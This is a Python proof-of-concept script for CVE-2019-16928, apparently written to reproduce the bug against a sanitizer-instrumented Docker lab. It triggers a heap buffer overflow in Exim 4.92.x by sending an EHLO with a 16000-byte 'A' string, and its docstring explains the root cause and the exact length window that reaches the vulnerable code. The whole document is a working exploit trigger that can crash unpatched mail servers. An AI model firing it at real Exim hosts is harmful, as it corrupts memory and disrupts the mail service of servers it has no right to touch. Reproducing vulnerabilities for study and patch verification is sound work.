#!/usr/bin/env python3
"""PoC for CVE-2019-16928 - Exim 4.92.1 heap buffer overflow in string_vformat.

The bug lives in src/string.c string_vformat(): when formatting a very long
EHLO domain into a gstring, the growth calculation underallocates and a heap
out-of-bounds write occurs (CWE-787). Affected 4.92..4.92.2, fixed in
478effbfd9c3cc5a627fc671d4bf94d13670d65f.

This client just:
  1. Connects to the target SMTP port.
  2. Reads the banner.
  3. Sends 'EHLO ' + a long all-'A' string + CRLF.
  4. Closes.

The accepted EHLO/HELO name is re-emitted into the HELO response via
string_fmt_append() -> string_vformat() (src/string.c, the extend=TRUE
"%s" path), where gstring_grow() underallocates by one and the trailing
sprintf() writes past the heap region.

IMPORTANT length window: the SMTP command buffer is SMTP_CMD_BUFFER_SIZE
(16384). A payload >~16380 bytes is rejected as an over-long command line
and never reaches the vulnerable formatter, so it does NOT crash. Use a
length in the ~15000-16300 range (all alphanumeric, so check_helo()
accepts it). 16000 is a reliable trigger.

Under an ASan/UBSan-instrumented exim the per-connection child crashes; the
AddressSanitizer heap-buffer-overflow trace appears in `docker logs`.

Usage:
    python3 poc_cve_2019_16928.py [host] [port] [length]
Defaults: 127.0.0.1 18028 16000
"""

import socket
import sys


def run(host: str, port: int, length: int) -> None:
    payload = b"EHLO " + (b"A" * length) + b"\r\n"
    print(f"[*] Target {host}:{port}  EHLO arg length={length}")
    try:
        with socket.create_connection((host, port), timeout=10) as s:
            s.settimeout(5)
            try:
                banner = s.recv(512)
                print(f"[*] Banner: {banner!r}")
            except socket.timeout:
                print("[!] No banner received (continuing)")
            s.sendall(payload)
            print(f"[*] Sent EHLO with {length} 'A' bytes")
            try:
                resp = s.recv(512)
                print(f"[*] Response: {resp!r}")
            except (socket.timeout, ConnectionResetError) as e:
                print(f"[*] No clean response / connection dropped: {e!r}")
    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"[*] Connection reset (consistent with child crash): {e!r}")
    except OSError as e:
        print(f"[!] Connection error: {e!r}")

    print()
    print("[*] Now inspect the server for the sanitizer crash:")
    print(
        "      docker logs smtp-cve-2019-16928-real 2>&1 | grep -A30 -i 'AddressSanitizer\\|runtime error\\|string_vformat'"
    )
    print("    Expect a heap-buffer-overflow / runtime error naming string_vformat (src/string.c).")


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 18028
    length = int(sys.argv[3]) if len(sys.argv) > 3 else 16000
    run(host, port, length)


if __name__ == "__main__":
    main()
